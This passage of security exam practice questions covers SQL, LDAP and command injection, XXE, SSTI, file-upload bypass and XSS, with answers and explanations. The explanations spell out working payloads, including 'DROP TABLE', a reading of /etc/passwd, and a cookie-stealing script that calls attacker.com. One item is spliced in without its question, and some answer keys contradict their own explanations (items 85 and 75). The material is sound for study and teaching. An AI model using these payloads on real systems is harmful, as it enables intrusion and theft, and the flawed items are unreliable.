  "explanation":
 "The input contains SQL code, not JavaScript (XSS). DoS aims to disrupt service, not manipulate data. Directory traversal uses `../` sequences. This is a classic example of a *SQL injection* attack. The attacker is injecting malicious SQL code into the user input field. The specific payload (`'; DROP TABLE users; --`) is designed to:
   *  `'`: Close the original SQL string literal (assuming the application uses single quotes to enclose the input).
  *  `;`: Terminate the original SQL statement.
 *    `DROP TABLE users`: This is the *malicious SQL command*. It attempts to *delete the entire `users` table* from the database.
  *   `--`: This is an SQL comment. It comments out any remaining part of the original SQL query to prevent syntax errors.

  If the application is vulnerable (i.e., it doesn't properly sanitize or validate user input and uses it directly in an SQL query), this injected code could be executed by the database server, resulting in the loss of user data. The *most effective* way to prevent SQL injection is to use *parameterized queries (prepared statements)* with *strict type checking* and *input validation*.",
"examTip": "SQL injection attacks involve injecting malicious SQL code into user input; `DROP TABLE` is a particularly destructive command used in such attacks."
},
{
     "id": 47,
   "question": "You are investigating a compromised Linux system.  You need a command that will show you the *listening* network ports, the *protocol* used (TCP or UDP), the *process ID (PID)*, and the *name of the program* that has each port open. Which command BEST provides this information?",
  "options": [
   "ps aux",
   "netstat -tulnp (or ss -tulnp)",
  "top",
  "lsof -i"
 ],
"correctAnswerIndex": 1,
   "explanation":
   "`ps aux` shows running *processes*, but not their network connections. `top` provides a dynamic view of resource usage, not detailed network port information. `lsof -i` lists open files, *including* network sockets, but it's less directly focused on *listening* ports with process information than `netstat` or `ss`. `netstat -tulnp` (or its modern equivalent, `ss -tulpn`) is specifically designed to display network connection information, and it's ideal for this task. The options provide:
 *   `-t`: Show TCP ports.
  *    `-u`: Show UDP ports.
    *    `-l`: Show only *listening* sockets (ports that are actively waiting for incoming connections).
    *   `-n`: Show numerical addresses (don't resolve hostnames, which is faster and avoids potential DNS issues).
     * `-p`: Show the *process ID (PID)* and *program name* associated with each socket.

    This combination provides the most comprehensive and relevant information for identifying which processes are listening on which ports, using which protocols.",
   "examTip": "`netstat -tulnp` (or `ss -tulpn`) is the go-to command for viewing listening ports, protocols, and associated processes on Linux."
},
{
     "id": 48,
  "question": "A user reports that their computer is running very slowly, the hard drive activity light is constantly flashing, and they are hearing unusual clicking or grinding noises coming from the computer.  What is the MOST likely cause of these symptoms, and what is the FIRST action the user should take?",
"options":[
   "The computer is likely infected with malware; the user should run a full system scan with antivirus software.",
 "The computer's hard drive is likely failing; the user should immediately back up all important data (if possible) and stop using the computer.",
   "The computer's operating system needs to be updated; the user should install the latest updates.",
 "The computer's power supply is failing; the user should replace the power supply."
    ],
"correctAnswerIndex": 1,
"explanation":
"While malware *can* sometimes cause slowdowns, the combination of *constant hard drive activity*, *unusual noises (clicking, grinding)*, and *slow performance* strongly suggests *imminent hard drive failure*. This is especially true for traditional mechanical hard drives (HDDs). The clicking or grinding sounds are often caused by the read/write heads physically contacting the platters, indicating a serious mechanical problem.
 The *first and most critical action* is to *immediately back up all important data* if the computer is still functioning well enough to do so. Any further use of the drive could lead to complete failure and data loss. After backing up data (or attempting to), the computer should be *powered off* and the hard drive should be replaced.
   Running an antivirus scan, updating the OS, or replacing the power supply are *not* the priority in this situation and could potentially worsen the problem if the hard drive is failing.",
 "examTip": "Unusual noises (clicking, grinding) from a hard drive, combined with slow performance and constant activity, are strong indicators of imminent hard drive failure; back up data immediately."
},
{
    "id": 49,
    "question": "What is the primary security benefit of implementing 'network segmentation'?",
     "options":[
    "It eliminates the need for firewalls, intrusion detection systems, and other security controls.",
 "It limits the impact of a security breach by isolating different parts of the network and restricting lateral movement, while also allowing unique security policies per segment.",
  "It allows all users on the network to access all resources without any restrictions.",
  "It automatically encrypts all data transmitted across the network."
    ],
 "correctAnswerIndex": 1,
  "explanation":
 "Network segmentation *complements* other security controls like firewalls and IDS, it doesn't replace them. It does *not* allow unrestricted access; it's the *opposite*. Encryption is a separate security measure. Network segmentation involves dividing a network into smaller, isolated subnetworks (segments or zones), often using:
   *   **VLANs (Virtual LANs):** Logical segmentation at Layer 2 of the OSI model.
     *    **Firewalls:** Physical or virtual firewalls to control traffic flow between segments.
     *    **Subnets:** Using different IP address ranges for different segments.
   * **Zero Trust principles**

The primary security benefits are:
  *    **Limited Lateral Movement:** If one segment is compromised (e.g., a user's workstation), the attacker's access to other segments (e.g., servers containing sensitive data) is *restricted*. This contains the breach and reduces the overall impact.
   *    **Reduced Attack Surface:** By isolating different parts of the network, you reduce the overall attack surface exposed to any single attacker.
     *   **Improved Security Posture:** Segmentation allows you to apply *different security policies* to different segments based on their sensitivity and risk level. For example, you might have stricter security controls for a segment containing servers with sensitive data than for a segment containing guest Wi-Fi access.
    *  **Compliance:** many compliance regulations require segmentation
    *   **Better Performance**: Segmentation can reduce congestion.",
    "examTip": "Network segmentation contains breaches, limits lateral movement, and allows for granular security policies, improving overall network security."
},
        "correctAnswerIndex": 1,
        "explanation": "Option (c) is attempting a stacked query, which may not be supported and isn't necessary for blind SQLi. (d) just causes a delay, not extracting any information. (a) is close, but it's less efficient and flexible. It directly compares the substring to 'a', requiring a separate request for *each* possible character. The most efficient and reliable approach (b) uses `SUBSTR((SELECT @@version),3,1)` to extract the *third* character of the database version (`@@version` is a common variable in many database systems). `ASCII()` converts this character to its numerical ASCII value.  `CASE WHEN` then checks if this value is equal to 97 (the ASCII value of 'a'). If it is, `SLEEP(5)` is executed, causing a 5-second delay. Otherwise, there's no delay. By systematically testing different ASCII values, you can determine the character based on the presence or absence of the delay.",
        "examTip": "For efficient character-by-character extraction in time-based blind SQL injection, use `SUBSTR()` to isolate the character, `ASCII()` to get its numerical value, and `CASE WHEN` (or `IF()`) combined with `SLEEP()` to create conditional delays."
    },
    {
        "id": 69,
        "question": "You are performing a penetration test against a web application that is protected by a Web Application Firewall (WAF). You suspect a potential SQL injection vulnerability. You want to test for basic SQL injection without triggering the WAF. Which of the following techniques is MOST likely to bypass a basic WAF signature that looks for common SQL keywords?",
        "options": [
            "a) Use standard SQL injection payloads like `' OR 1=1--`.",
            "b) Use URL encoding to obfuscate SQL keywords.",
            "c) Use comments and whitespace variations within the SQL keywords.",
            "d) Both B and C"
        ],
        "correctAnswerIndex": 3,
        "explanation": "Standard payloads are likely to be detected by even a basic WAF. URL encoding *might* work, but it's easily decoded by the WAF. The *most likely* bypass for a *basic* signature-based WAF is to use *variations in whitespace and comments*.  For example, instead of `SELECT * FROM users`, you might try `SELECT/**/ * /**/FROM/**/users`. Or, you could use `SEL/**/ECT * FR/**/OM users`.  Many basic WAFs look for *exact* keyword matches and might be bypassed by these variations.",
        "examTip": "To bypass basic WAF signatures, try variations in whitespace, comments, and case within SQL keywords. More sophisticated WAFs will use more advanced techniques (like AST parsing) and will be harder to bypass."
    },
    {
        "id": 70,
        "question": "You are analyzing a network capture (pcap file) and suspect that data may be exfiltrated using ICMP tunneling. Which Wireshark display filter is MOST effective for isolating potential ICMP tunneling traffic?",
        "options":[
          "a) `icmp`",
          "b) `icmp.type == 8`",
          "c) `icmp.data.len > 64`",
          "d) `icmp && !(icmp.type==8 || icmp.type==0)`"
        ],
        "correctAnswerIndex": 2,
        "explanation": "`icmp` shows *all* ICMP traffic. `icmp.type == 8` shows only ICMP Echo Requests (pings), which *could* be used for tunneling, but it's not the most comprehensive filter.  `icmp && !(icmp.type==8 || icmp.type==0)` excludes both echo requests and replies, which would *hide* potential tunneling. The best filter is `icmp.data.len > 64`. Normal ICMP Echo Request/Reply packets have a small data payload. ICMP tunneling often involves embedding data *within* the ICMP data field.  By filtering for ICMP packets with a data length *greater than* a certain threshold (e.g., 64 bytes), you can isolate packets that are more likely to contain exfiltrated data.",
        "examTip": "To identify potential ICMP tunneling in Wireshark, filter for ICMP packets with unusually large data payloads (e.g., `icmp.data.len > 64`)."
    },
    {
        "id": 71,
        "question": "You have obtained a shell on a compromised Windows system. You want to enumerate all currently logged-on users, including those connected via Remote Desktop Services (RDS). Which command is MOST comprehensive and reliable for achieving this?",
        "options": [
           "a) `whoami`",
            "b) `net user`",
            "c) `query user /server:<servername>` or `qwinsta`",
            "d) `tasklist`"
        ],
        "correctAnswerIndex": 2,
        "explanation": "`whoami` only shows the *current* user. `net user` lists *local* user accounts, not necessarily logged-on users. `tasklist` shows running processes, not logged-on users.  `query user` (or its alias `qwinsta`) is specifically designed to query Terminal Services/Remote Desktop Services sessions. It shows *all* currently logged-on users, including local console users and users connected via RDP. The `/server` parameter is optional and allows querying a remote server.",
        "examTip": "Use `query user` (or `qwinsta`) on Windows systems to enumerate all currently logged-on users, including those connected via Remote Desktop Services."
    },
        {
        "id": 72,
        "question": "You are performing a penetration test against a web application and have identified a potential LDAP injection vulnerability. The application uses an LDAP filter to search for users based on user input. The filter looks like this: `(&(objectClass=user)(uid=USER_INPUT))`.  Which of the following payloads, injected into the `USER_INPUT` field, is MOST likely to allow you to retrieve *all* user objects, bypassing the intended filter logic?",
        "options":[
          "a) `admin*) (&(objectClass=*`",
          "b) `admin`",
          "c) `*)(objectClass=*`",
          "d) `*`"
        ],
        "correctAnswerIndex": 2,
        "explanation": "Simply providing `admin` won't bypass the filter. Providing just `*` might work, but it depends on the LDAP server's configuration. The most reliable and common bypass is `*)(objectClass=*)`. This closes the original `uid` filter and adds a *new* filter: `(objectClass=*)`. This filter matches *all* objects, effectively retrieving all users. It's more reliable than just `*` because it explicitly defines a complete, valid filter.",
        "examTip": "In LDAP injection, closing the original filter and adding a new filter that matches all objects (e.g., `*)(objectClass=*)`) is a common and effective technique to bypass intended restrictions."
    },
{
    "id": 73,
    "question": "You are analyzing a web application that allows users to upload files. The application checks the file type by examining the `Content-Type` header in the HTTP request. It only allows uploads with `Content-Type: image/jpeg` or `Content-Type: image/png`. You want to upload a PHP webshell. Which of the following Burp Suite Repeater requests is MOST likely to bypass this check and successfully upload the webshell?",
    "options":[
        "a) ```http\nPOST /upload.php HTTP/1.1\nHost: example.com\nContent-Type: application/x-php\n\n<?php phpinfo(); ?>\n```",
        "b) ```http\nPOST /upload.php HTTP/1.1\nHost: example.com\nContent-Type: image/jpeg\n\n<?php phpinfo(); ?>\n```",
        "c) ```http\nPOST /upload.php HTTP/1.1\nHost: example.com\nContent-Type: text/plain\n\n<?php phpinfo(); ?>\n```",
        "d) `Changing file extension to .php.jpeg`"
    ],
    "correctAnswerIndex": 1,
    "explanation": "The application *explicitly* checks for `image/jpeg` or `image/png`. Providing `application/x-php` or `text/plain` will be rejected. The correct approach is to *lie* about the `Content-Type`. Send the request with `Content-Type: image/jpeg` (or `image/png`), but include the PHP code *as the file content*.  If the application *only* checks the `Content-Type` header and doesn't perform any content validation, this will bypass the check, and the PHP code will be uploaded. While d is a bypass technique, it is not an option in this case",
    "examTip": "When testing file upload vulnerabilities, manipulate the `Content-Type` header to match the expected type, even if the actual file content is different. This can bypass checks that rely solely on the header."
},
{
    "id": 74,
    "question":"You are performing a penetration test on a web application and discover a potential command injection vulnerability. Examine the following URL:\n`http://example.com/ping.php?ip=127.0.0.1%0Acat%20/etc/passwd`\nWhat is the vulnerability being tested, and how is the payload attempting to exploit it?",
    "options":[
        "a) XSS, injecting javascript",
        "b) SQL Injection, with union select",
        "c) Command injection, with a newline character.",
        "d) LFI, including the etc/passwd"
    ],
    "correctAnswerIndex": 2,
    "explanation": "The URL includes a parameter named `ip`, suggesting a ping functionality. The payload `127.0.0.1%0Acat%20/etc/passwd` uses URL encoding. `%0A` represents a newline character, and `%20` represents a space.  This is a command injection attempt. The attacker is trying to inject the `cat /etc/passwd` command *after* the intended `ping` command. The newline character (`%0A`) is crucial. It acts as a command separator in many shells, effectively making the server execute two commands: `ping 127.0.0.1` and `cat /etc/passwd`.",
    "examTip": "Newline characters (`%0A` in URL-encoded form) are often used in command injection attacks to separate injected commands from the intended command."
},
{
  "id": 75,
  "question": "You are analyzing a compromised Linux server and find a suspicious SUID binary named `reporter`. When you run `strings reporter`, you see the following strings, among others:\n```\n/bin/cat\n/tmp/report.txt\n```\nWhat is a LIKELY vulnerability in this binary, and how could you potentially exploit it?",
  "options":[
    "a) The binary is vulnerable to buffer overflow",
    "b) The binary is using a relative path; Exploit by modifying the PATH environment variable.",
    "c) The binary is reading from a world-writable location (/tmp/report.txt); Exploit by modifying the file.",
    "d) The binary has no vulnerability."

  ],
  "correctAnswerIndex": 1,
  "explanation": "The presence of `/bin/cat` and `/tmp/report.txt` suggests the binary likely reads and displays (or otherwise uses) the contents of `/tmp/report.txt`.  The key is that `/bin/cat` is a *full path*, but no *full path* is used before the command.  This means the binary is likely vulnerable to a *PATH manipulation* attack.  If you create a malicious executable named `cat` in a directory you control, *and* you prepend that directory to the `PATH` environment variable, *before* running the SUID binary, the binary will execute *your* malicious `cat` instead of the real `/bin/cat`, with the privileges of the SUID binary's owner (likely root).",
  "examTip": "If a SUID binary uses external commands without specifying the full path, it's likely vulnerable to PATH manipulation. Prepend a directory containing a malicious executable with the same name to the `PATH` to exploit this."
},
{
"id":76,
"question": "Analyze this snippet of a Windows batch script:\n```batch\n@echo off\nsetlocal\nset user_input=%1\n\nif \"%user_input%\"==\"admin\" (\n echo Access Granted\n) else (\n echo Access Denied\n)\n```\nWhat is the vulnerability, and how can you exploit it?",
"options":[
    "a) Command Injection, provide `admin & id`",
    "b) Command injection, providing `admin&&(id)`.",
    "c) It is not vulnerable",
    "d) Command injection, providing `admin\" & id & \"`."
],
"correctAnswerIndex": 3,
"explanation": "This script checks if the first argument (`%1`) is equal to "admin". While it *looks* like it might be vulnerable to command injection, the double quotes around `%user_input%` in the `if` statement *prevent* basic command injection using `&` or `;`. However, if you provide input that *includes* double quotes, you can break out of the intended string comparison. The payload `admin\" & id & \"` will cause the `if` statement to become: `if ""admin"" & id & """=="admin"`. This is no longer a simple string comparison.  The `&` will be treated as a command separator, and the `id` command will be executed.",
"examTip": "Even with seemingly secure quoting in batch scripts, be aware of how double quotes within the input can be used to break out of string comparisons and enable command injection."
},
{
 "id": 77,
 "question": "You are performing a penetration test on a web application that is known to be written in Java. You discover a URL that causes the application to return a stack trace revealing the use of the Apache Struts 2 framework. You also find that the application is using an older version of Struts 2.  Which vulnerability is MOST likely to be present, and what tool could you use to automate exploitation?",
 "options":[
    "a) SQL injection ; sqlmap",
    "b) Remote Code Execution (RCE) via OGNL injection;  A custom exploit or a tool like Metasploit.",
    "c) Cross-Site Scripting(XSS); Burp Suite",
    "d) File inclusion; Nikto"
 ],
 "correctAnswerIndex": 1,
 "explanation": "Older versions of Apache Struts 2 are *notorious* for having Remote Code Execution (RCE) vulnerabilities due to flaws in how they handle Object-Graph Navigation Language (OGNL) expressions. While SQL injection, XSS, and file inclusion are *possible*, they are not specifically associated with Struts 2.  OGNL injection allows attackers to execute arbitrary Java code on the server. You could craft a custom exploit, but tools like Metasploit have modules specifically designed to exploit known Struts 2 OGNL injection vulnerabilities.",
 "examTip": "When encountering Apache Struts 2, especially older versions, immediately consider the possibility of OGNL injection vulnerabilities leading to RCE. Metasploit is a valuable resource for exploiting these flaws."
},
{
    "id": 78,
     "question": "You are analyzing a web application and observe that it sets a session cookie after successful authentication. The `Set-Cookie` header looks like this: `Set-Cookie: sessionid=abcdef1234567890; Secure; HttpOnly; SameSite=Lax`.  Which of the following statements BEST describes the security properties of this cookie, based *solely* on this header?",
     "options":[
       "a) The cookie is fully protected against common web attacks.",
       "b) The cookie is protected against XSS and MITM attacks over HTTPS, but is vulnerable to CSRF attacks from other sites on the same top-level domain.",
       "c) The cookie is only vulnerable to XSS",
       "d) The cookie is fully vulnerable."
     ],
      "correctAnswerIndex": 1,
      "explanation": "`Secure` means the cookie will *only* be transmitted over HTTPS, protecting against man-in-the-middle (MITM) attacks that rely on intercepting unencrypted traffic. `HttpOnly` prevents client-side JavaScript from accessing the cookie, mitigating XSS-based cookie theft. `SameSite=Lax` provides *some* protection against Cross-Site Request Forgery (CSRF) by restricting when the cookie is sent with cross-site requests. However, `Lax` allows the cookie to be sent with top-level navigations (e.g., clicking a link), so it's *not* full CSRF protection. It specifically protects from other sites, not subdomains, on the *same top-level domain*.  It's *not* fully protected, but it has good security properties.",
      "examTip": "Understand the security implications of cookie attributes: `Secure`, `HttpOnly`, and `SameSite`. `SameSite=Lax` provides partial CSRF protection, but `SameSite=Strict` is stronger."
},
{
    "id": 79,
    "question": "Examine this snippet of Ruby code:\n```ruby\nrequire 'open3'\n\nurl = ARGV[0]\n\nstdout, stderr, status = Open3.capture3(\"curl #{url}\")\n\nputs stdout\n```\nWhat is the PRIMARY vulnerability in this code, and what is a potential exploit string?",
    "options":[
      "a) Command Injection, exploit: `$(id)`",
        "b) Command Injection, exploit: `;id`",
        "c) Command Injection, exploit: `https://example.com; id`",
      "d) The code is not vulnerable"
    ],
    "correctAnswerIndex": 2,
    "explanation": "The code uses `Open3.capture3` to execute the `curl` command with a URL provided as a command-line argument (`ARGV[0]`). The vulnerability is *command injection*. The code directly interpolates the user-provided URL into the command string *without* proper sanitization.  An attacker can provide a URL that includes shell metacharacters, such as a semicolon (`;`), to inject additional commands. The payload `https://example.com; id` would cause the shell to execute both `curl https://example.com` and `id`.",
    "examTip": "In Ruby (and other languages), be extremely cautious when using functions that execute system commands (like `Open3.capture3`, `system`, `exec`) with user-provided input.  Always sanitize input or use safer methods that separate commands and arguments."
},
{
    "id": 80,
     "question": "You are performing a penetration test against a web application and have discovered a potential XML External Entity (XXE) vulnerability. The application appears to be using a Java-based XML parser.  Which of the following XXE payloads is MOST likely to successfully read the contents of the `/etc/passwd` file *and* be compatible with common Java XML parsers?",
     "options":[
        "a) `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>`",
        "b) `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\"> ]><foo>&xxe;</foo>`",
        "c) `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe; ]><foo></foo>`",
        "d) `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///path/to/file.jar!/file.txt\"> ]> <foo>&xxe;</foo>`"
     ],
     "correctAnswerIndex": 0,
      "explanation": "(b) tests for out-of-band XXE. (c) defines and then uses parameter entity, which can be good but its not best. (d) is good but we are trying to read etc/passwd. (a) is the *classic* and most straightforward XXE payload for reading local files. It defines an *external* entity (`xxe`) that references the `/etc/passwd` file using the `file://` URI scheme. If the XML parser is vulnerable, it will resolve this entity and include the contents of the file in the XML document, which will likely be returned to the attacker. This payload is generally compatible with Java XML parsers that are vulnerable to XXE.",
      "examTip": "The standard XXE payload `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///path/to/file\"> ]><foo>&xxe;</foo>` is often the most reliable for testing and exploiting basic XXE vulnerabilities, including on Java platforms."
},
{
"id": 81,
"question": "You are auditing a Docker environment and want to identify containers running with excessive privileges. Which of the following commands provides the MOST comprehensive and direct information about a container's capabilities and security context?",
"options": [
"a) `docker ps`",
"b) `docker inspect <container_id>`",
"c) `docker top <container_id>`",
"d) `docker stats <container_id>`"
],
"correctAnswerIndex": 1,
"explanation": "`docker ps` lists running containers, but doesn't show detailed security configurations. `docker top` shows processes *inside* the container, not its security context. `docker stats` shows resource usage.  `docker inspect <container_id>` provides *extensive* information about a container, including its configuration, network settings, and, crucially, its *security context*. This includes information about capabilities (e.g., `CAP_SYS_ADMIN`), security options (e.g., AppArmor profile, SELinux context), and whether the container is running in privileged mode (`--privileged`).",
"examTip": "`docker inspect <container_id>` is the key command for auditing a Docker container's security configuration, including capabilities, security options, and privileged mode."
},
{
 "id": 82,
    "question": "You are performing a black-box penetration test against a web application. While browsing the application, you observe the following URL: `http://example.com/profile.php?userid=123`. You change the `userid` parameter to `124`, and you see the profile information for a *different* user.  What type of vulnerability does this MOST strongly suggest?",
  "options": [
    "a) Cross-Site Scripting (XSS)",
    "b) SQL Injection",
    "c) Insecure Direct Object Reference (IDOR)",
    "d) Session Fixation"
  ],
 "correctAnswerIndex": 2,
 "explanation": "The ability to view *other users'* data by simply changing a numeric ID in the URL is a classic indicator of an Insecure Direct Object Reference (IDOR) vulnerability.  The application is not properly verifying that the currently logged-in user is *authorized* to access the data associated with the provided `userid`.  It's not XSS (which involves injecting scripts), SQL injection (which involves manipulating database queries), or session fixation (which involves setting a known session ID).",
  "examTip": "IDOR vulnerabilities are common. Always test if you can access other users' data or resources by modifying identifiers (like user IDs, account numbers, file IDs) in URLs or request parameters."
},
{
 "id": 83,
    "question": "You are reviewing the source code of a web application and find the following snippet written in Python using the Flask framework:\n```python\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n template = request.args.get('template')\n return render_template_string(template)\n```\nWhat is the PRIMARY vulnerability, and how could it be exploited?",
 "options":[
   "a) Server-Side Template Injection (SSTI); Inject template syntax to execute code.",
   "b) Cross-Site Scripting, Inject HTML",
   "c) Path Traversal; injecting ../",
   "d) LFI; injecting local file."
 ],
 "correctAnswerIndex": 0,
 "explanation": "The code uses `render_template_string` with user-provided input (`request.args.get('template')`). This is a *classic* Server-Side Template Injection (SSTI) vulnerability.  `render_template_string` expects a *template string*, not a filename.  If an attacker can control the `template` parameter, they can inject template syntax (e.g., Jinja2 syntax in Flask) to execute arbitrary code on the server. For example, injecting `{{ config }}` might reveal the application's configuration, and injecting `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` could execute the `id` command.",
 "examTip": "Never use `render_template_string` (or similar functions in other frameworks) with *untrusted* user input.  This is a high-risk SSTI vulnerability. Use `render_template` with a *filename* instead, and ensure user input is used only for *data* within the template, not for the template structure itself."
},
{
    "id": 84,
     "question": "You are performing a penetration test against a web application and have obtained a valid session cookie. You want to determine if this cookie is vulnerable to replay attacks. Which of the following actions would BEST demonstrate a successful replay attack?",
    "options":[
        "a) Modify the cookie value and observe if the application accepts it.",
        "b) Use the cookie in a different browser or on a different machine and observe if you are still authenticated.",
        "c) Delete the cookie and observe if you are logged out.",
        "d) Use burp to replay the cookie"
    ],
     "correctAnswerIndex": 1,
      "explanation": "Modifying the cookie tests for session integrity, not replay. Deleting the cookie tests session termination. The core of a *replay* attack is using a previously valid session cookie *again*, *without any modification*, to regain access.  The most direct test is to use the captured cookie in a *different* browser or on a *different* machine.  If you are successfully authenticated, it demonstrates that the cookie can be replayed, indicating a lack of proper session invalidation or replay protection mechanisms (like short-lived, one-time tokens).",
     "examTip": "A successful replay attack involves using a previously valid session identifier (e.g., a cookie) *without modification* in a different context (different browser, machine, or time) to regain access."
},
{
 "id": 85,
 "question": "You are analyzing a web application and discover a hidden form field with the name `csrf_token` and a long, seemingly random value. You submit the form without modifying the token, and the request succeeds. You then submit the same form *again* with the *same* token value, and the request *also* succeeds. What is the PRIMARY security implication?",
 "options":[
  "a) The application is vulnerable to CSRF attacks.",
  "b) The CSRF token is not being properly validated.",
  "c) The CSRF token is likely a static value, making it ineffective.",
  "d) The application uses a per-session CSRF tokens"
 ],
  "correctAnswerIndex": 3,
  "explanation": "The fact that the *same* token value works for *multiple* submissions strongly suggests the token is *static* (or has a very long lifespan) and is not being properly validated *per request*. Effective CSRF protection requires a *unique*, unpredictable token for *each* form submission (or at least per session, with proper invalidation). A static token defeats the purpose of CSRF protection, as an attacker can obtain the token once and reuse it indefinitely.",
  "examTip": "CSRF tokens must be unique per request (or at least per session, with proper invalidation) and unpredictable.  If the same token works multiple times, it indicates a flawed CSRF protection mechanism."
},
{
    "id": 86,
    "question": "You are performing a security assessment of a Kubernetes cluster. You want to identify any pods that are running with root privileges. Which of the following `kubectl` commands is MOST effective for this purpose?",
    "options": [
        "a) `kubectl get pods`",
        "b) `kubectl describe pod <pod_name>`",
        "c) `kubectl get pods -o jsonpath='{.items[*].spec.containers[*].securityContext.runAsUser}'`",
        "d) `kubectl get pods -o yaml`"
    ],
    "correctAnswerIndex": 2,
   "explanation": "`kubectl get pods` lists pods, but doesn't show security details. `kubectl describe pod <pod_name>` provides detailed information about a *specific* pod, but you'd need to run it for *every* pod. `kubectl get pods -o yaml` provides the full YAML definition of all pods, which is verbose and requires manual parsing. The most *efficient* and *direct* method is to use `kubectl get pods -o jsonpath='{.items[*].spec.containers[*].securityContext.runAsUser}'`. This uses a JSONPath expression to extract the `runAsUser` field from the `securityContext` of *all* containers within *all* pods. If a container is running as root, this field will be `0` (or be absent, implying root). Any other value indicates a non-root user.",
    "examTip": "Use `kubectl` with JSONPath expressions to efficiently query and filter Kubernetes resources based on specific attributes, including security-relevant settings like `runAsUser`."
},
{
    "id": 87,
    "question": "You are analyzing a web application and discover that it's vulnerable to Cross-Site Scripting (XSS) in a reflected context. The application sanitizes common XSS payloads by removing `<script>` tags and encoding `<` and `>` characters. However, it does *not* filter or encode double quotes (`"`) or single quotes (`'`). The vulnerable parameter is reflected within an HTML attribute, like so: `<input type="text" value="USER_INPUT">`. Which of the following payloads is MOST likely to successfully execute JavaScript code?",
    "options": [
       "a) `<script>alert(1)</script>`",
       "b) `test`",
       "c) `\" onmouseover=\"alert(1)`",
       "d) `' onmouseover='alert(1)`"

    ],
    "correctAnswerIndex": 2,
    "explanation": "Injecting a full `<script>` tag is impossible due to the filtering. Providing simple text won't trigger XSS. The key is to break out of the `value` attribute using either a single or double quote *and* then use an HTML event handler to execute JavaScript. Since *both* single and double quotes are not encoded, *either* c or d *could* work. However, if you had to choose *one* to try *first*, option c `\" onmouseover=\"alert(1)` is slightly more conventional for breaking out of a double-quoted attribute, then option d.",
    "examTip": "When exploiting XSS within HTML attributes, use unencoded quotes (single or double, depending on the context) to break out of the attribute value and then use an event handler (like `onmouseover`, `onclick`, `onerror`) to execute JavaScript."
},
{
  "id": 88,
    "question": "Consider the following snippet of a Dockerfile:\n```dockerfile\nFROM ubuntu:latest\n\nCOPY secret.txt /\n\nRUN chmod 644 /secret.txt\n```\nWhat is the PRIMARY security concern with this Dockerfile?",
  "options": [
    "a) Using the 'latest' tag for the base image.",
    "b) Copying a file named 'secret.txt' into the image and making it world-readable.",
    "c) Using the RUN Command.",
    "d) Using the COPY Command."
  ],
    "correctAnswerIndex": 1,
    "explanation": "Using the `latest` tag is generally discouraged, as it can lead to unpredictable builds. However, the *most immediate* and critical security concern is copying a file named `secret.txt` into the image *and then making it world-readable* (`chmod 644`). This means *any user* inside the container (and potentially anyone with access to the image) can read the contents of `secret.txt`, which, based on its name, likely contains sensitive information.  The `COPY` and `RUN` commands themselves aren't inherently insecure; it's *how* they are used that creates the vulnerability.",
    "examTip": "Never include sensitive files (secrets, keys, passwords) directly in Docker images, *especially* not with world-readable permissions. Use secrets management solutions (like Docker Secrets or environment variables) instead."

},
{
 "id": 89,
    "question": "You are performing a penetration test against a web application that uses a REST API. You discover an endpoint that allows you to retrieve user information by ID: `/api/users/{id}`. You also find that the API uses API keys for authentication, passed in the `X-API-Key` header. You obtain a valid API key for a low-privileged user. You want to test for privilege escalation. Which of the following actions is MOST likely to reveal a privilege escalation vulnerability?",
 "options":[
  "a) Remove the `X-API-Key` header and send the request.",
  "b) Modify the `{id}` parameter to access other users' information.",
  "c) Attempt to access other API endpoints (e.g., `/api/admin/users`) that might require higher privileges, using the low-privileged API key.",
  "d) Change the HTTP request from GET to POST."
 ],
 "correctAnswerIndex": 2,
 "explanation": "Removing the API key tests for authentication bypass, not privilege escalation. Modifying the `{id}` parameter tests for IDOR (accessing other users' data), not privilege escalation *within* your own account. Changing the HTTP method might reveal other vulnerabilities but is less directly related to privilege escalation. The most direct test for privilege escalation is to attempt to access API endpoints or perform actions that *should* require higher privileges (e.g., accessing an `/api/admin/` endpoint) *using the low-privileged API key*. If the application doesn't properly enforce authorization, you might gain access to functionality or data that should be restricted.",
 "examTip": "To test for privilege escalation with API keys, attempt to access higher-privilege endpoints or perform privileged actions using a low-privileged key. This checks if authorization is properly enforced."
},
{
"id": 90,
"question": "You are analyzing a web application that is vulnerable to Cross-Site Scripting (XSS). You have successfully injected a simple `alert()` payload, confirming the vulnerability. You now want to exfiltrate the user's cookies to your own server. Assuming the application does *not* use HttpOnly cookies, which of the following JavaScript payloads is the MOST concise and effective for achieving this?",
"options":[
   "a) `<script>alert(document.cookie)</script>`",
    "b) `<script>window.location='http://attacker.com/?cookie='+document.cookie</script>`",
    "c) `<img src='x' onerror='this.src=\"http://attacker.com/?cookie=\"+document.cookie'>`",
    "d) `<iframe onload='this.contentWindow.location=\"http://attacker.com/?cookie=\"+document.cookie'></iframe>`"
],
"correctAnswerIndex": 1,
"explanation": "Simply alerting the cookie (a) confirms XSS but doesn't *exfiltrate* the data. Using an `<img>` tag with an `onerror` handler (c) or an `<iframe>` with an `onload` handler (d) *could* work, but they are less direct and potentially more noticeable. The most *concise and effective* payload is (b): `<script>window.location='http://attacker.com/?cookie='+document.cookie</script>`. This uses JavaScript to redirect the user's browser to your attacker-controlled server (`http://attacker.com`), appending the user's cookies as a URL parameter (`?cookie=`). You can then capture the cookies from your server's access logs.",
"examTip": "To exfiltrate cookies via XSS, use JavaScript to redirect the user's browser to your server, appending the cookies as a URL parameter: `window.location='http://attacker.com/?cookie='+document.cookie`."
},
{
    "id": 91,
    "question": "You are reviewing the following Nginx web server configuration snippet:\n```nginx\nserver {\n listen 80;\n server_name example.com www.example.com;\n\n location / {\n proxy_pass http://backend_server;\n proxy_set_header Host $host;\n proxy_set_header X-Real-IP $remote_addr;\n proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n }\n\n location /secret {\n internal;\n }\n}\n```\nWhat is the purpose of the `location /secret { internal; }` block, and how does it enhance security?",
    "options": [
        "a) It creates a publicly accessible directory named 'secret'.",
        "b) It defines a location that is only accessible from within the Nginx server itself, preventing external access.",
        "c) It redirects all requests to /secret to the backend.",
        "d) It creates an alias"
    ],
    "correctAnswerIndex": 1,
